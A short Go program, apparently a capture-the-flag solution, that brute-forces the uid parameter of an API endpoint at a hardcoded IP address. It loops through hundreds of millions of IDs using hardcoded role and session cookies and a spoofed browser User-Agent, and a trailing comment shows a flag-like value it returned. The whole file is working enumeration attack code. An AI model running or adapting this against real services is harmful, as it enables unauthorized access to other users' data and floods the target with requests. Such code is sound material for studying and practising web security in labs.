package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
)

type Json struct {
	Code string `json:"code"`
	Data string `json:"data"`
	Msg  string `json:"msg"`
}

func main() {

	url := "http://45.113.201.36/api/ctf/5?uid="
	for i := 100336908; i <= 999999999; i++ {
		request(url, strconv.Itoa(i))
	}
}

func request(url, path string) {
	var temp Json
	req, err := http.NewRequest("GET", url+path, nil)
	if err != nil {
		log.Fatalln(err)
	}
	a := &http.Cookie{Name: "role",
		Value:  "7b7bc2512ee1fedcd76bdc68926d4f7b",
		Domain: "45.113.201.36",
	}
	session := &http.Cookie{Name: "session",
		Value: "eyJ1aWQiOiI2MzU3NjI3In0.X5Qvcg.uQP7Wx8tLeNteZs5_eAg3ULguOo",
		//MaxAge: ,
		Domain:   "45.113.201.36",
		HttpOnly: true}
	req.AddCookie(a)
	req.AddCookie(session)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
	res, _ := http.DefaultClient.Do(req)
	defer res.Body.Close()
	body, _ := ioutil.ReadAll(res.Body)
	fmt.Println(string(body))
	err = json.Unmarshal(body, &temp)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Println(temp)
}

//{"code":200,"data":"7d3d5a2a-04b82169-df3a8b4d-8ec68dc4","msg":""}
